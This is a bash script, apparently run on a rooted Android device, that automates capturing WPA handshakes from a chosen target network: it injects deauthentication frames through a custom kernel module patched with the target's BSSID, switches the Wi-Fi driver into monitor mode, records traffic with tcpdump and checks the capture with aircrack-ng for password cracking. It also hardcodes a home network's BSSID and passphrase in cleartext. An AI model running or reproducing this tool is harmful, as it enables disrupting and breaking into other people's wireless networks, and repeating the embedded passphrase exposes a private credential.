#!/bin/bash
# grab_hs7.sh - Fast handshake capture with ~750ms mode switch
# Usage: grab_hs7.sh <BSSID> <SSID> <CHANNEL> [ROUNDS] [CAPTURE_SEC]
# petx8.ko must be pre-patched with target BSSID on host before pushing
set -o pipefail

BSSID="${1:?Usage: $0 <BSSID> <SSID> <CHANNEL> [ROUNDS] [CAPTURE_SEC]}"
SSID="${2:?Missing SSID}"
CH="${3:?Missing CHANNEL}"
ROUNDS="${4:-10}"
CAPTURE_SEC="${5:-20}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"

ch2freq() {
    case "$1" in
        1) echo 2412;; 2) echo 2417;; 3) echo 2422;; 4) echo 2427;;
        5) echo 2432;; 6) echo 2437;; 7) echo 2442;; 8) echo 2447;;
        9) echo 2452;; 10) echo 2457;; 11) echo 2462;; 12) echo 2467;; 13) echo 2472;;
        36) echo 5180;; 40) echo 5200;; 44) echo 5220;; 48) echo 5240;;
        *) echo $((2407 + $1 * 5));;
    esac
}

wait_wlan0() {
    for i in $(seq 1 80); do
        ip link show wlan0 &>/dev/null && return 0
        sleep 0.05
    done
    return 1
}

cleanup() {
    echo ""
    echo "[*] Cleaning up..."
    killall wpa_supplicant tcpdump 2>/dev/null
    rmmod kfind 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1
    insmod "$DRIVER" 2>/dev/null
    wait_wlan0
    sleep 2
    systemctl start NetworkManager 2>/dev/null
    sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] Home WiFi restored."
}
trap cleanup EXIT

FREQ=$(ch2freq "$CH")
echo ""
echo "============================================"
echo " Target: $SSID ($BSSID)"
echo " Channel: $CH ($FREQ MHz)"
echo " Rounds: $ROUNDS, Capture: ${CAPTURE_SEC}s/round"
echo " Mode switch: ~750ms (fast poll)"
echo "============================================"
echo ""

cat > /tmp/wpa_target.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

rm -f /tmp/hs_grab*.pcap /tmp/handshake_result.pcap
HANDSHAKE_FOUND=0

for round in $(seq 1 "$ROUNDS"); do
    echo "========== ROUND $round/$ROUNDS =========="

    # === PHASE 1: Load STA driver ===
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant tcpdump 2>/dev/null
    sleep 0.5
    rmmod kfind 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 0.5
    insmod "$DRIVER"
    wait_wlan0 || { echo "  [!] wlan0 not found"; continue; }
    sleep 2
    ip link set wlan0 up
    sleep 0.5

    # === PHASE 2: Connect + deauth ===
    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    dmesg | tail -1 > /tmp/.dmesg_marker
    MARKER_LINE=$(cat /tmp/.dmesg_marker)

    wpa_supplicant -i wlan0 -c /tmp/wpa_target.conf -B -D nl80211 2>/dev/null

    # Wait for "Connecting to" in dmesg (PE session creation)
    PE_FOUND=0
    for w in $(seq 1 60); do
        if dmesg | tail -20 | grep -q "Connecting to"; then
            PE_FOUND=1
            break
        fi
        sleep 0.05
    done

    DEAUTH_COUNT=0
    if [ "$PE_FOUND" -eq 1 ]; then
        # Fire petx8 rapidly 3 times
        for f in 1 2 3; do
            rmmod kfind 2>/dev/null
            insmod /tmp/petx8.ko 2>/dev/null
        done
        DEAUTH_COUNT=$(dmesg | tail -20 | grep -c "Deauth TX")
        echo "  [+] PE found, deauths: $DEAUTH_COUNT"
    else
        echo "  [-] No PE session (no 'Connecting to' in dmesg)"
    fi

    # === PHASE 3: FAST switch to monitor ===
    killall wpa_supplicant 2>/dev/null
    rmmod kfind 2>/dev/null

    T0=$(date +%s%N)
    rmmod wlan
    insmod "$DRIVER" con_mode_monitor=4
    wait_wlan0 || { echo "  [!] wlan0 not found after monitor insmod"; continue; }
    ip link set wlan0 up
    iw dev wlan0 set freq "$FREQ"
    T1=$(date +%s%N)
    echo "  [*] Switch: $(( (T1-T0)/1000000 ))ms"

    # === PHASE 4: Capture ===
    PCAP="/tmp/hs_grab${round}.pcap"
    timeout "$CAPTURE_SEC" tcpdump -i wlan0 -w "$PCAP" 2>/dev/null &
    TCPID=$!
    echo "  [*] Capturing ch$CH ${CAPTURE_SEC}s..."
    wait $TCPID 2>/dev/null

    FSIZE=$(stat -c%s "$PCAP" 2>/dev/null || echo 0)

    # Check for EAPOL (ether type 0x888e) — robust counting
    EAPOL_COUNT=0
    if [ "$FSIZE" -gt 24 ]; then
        # RadioTap+802.11 EAPOL: look for 888e in decoded output
        EAPOL_COUNT=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        # Strip whitespace
        EAPOL_COUNT=$(echo "$EAPOL_COUNT" | tr -d '[:space:]')
        [ -z "$EAPOL_COUNT" ] && EAPOL_COUNT=0
    fi

    echo "  [*] Size: ${FSIZE}B, EAPOL: $EAPOL_COUNT"

    if [ "$EAPOL_COUNT" -gt 0 ]; then
        echo "  [!!!] EAPOL DETECTED!"
        aircrack-ng "$PCAP" 2>&1 | head -20
        if aircrack-ng "$PCAP" 2>&1 | grep -q "1 handshake"; then
            echo ""
            echo "  ===== HANDSHAKE CAPTURED! ====="
            cp "$PCAP" /tmp/handshake_result.pcap
            HANDSHAKE_FOUND=1
            break
        fi
    fi
    echo ""
done

echo ""
echo "============================================"
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo " SUCCESS! /tmp/handshake_result.pcap"
    echo " adb pull /tmp/handshake_result.pcap"
else
    echo " No handshake in $ROUNDS rounds"
    echo " Files:"
    ls -la /tmp/hs_grab*.pcap 2>/dev/null
fi
echo "============================================"
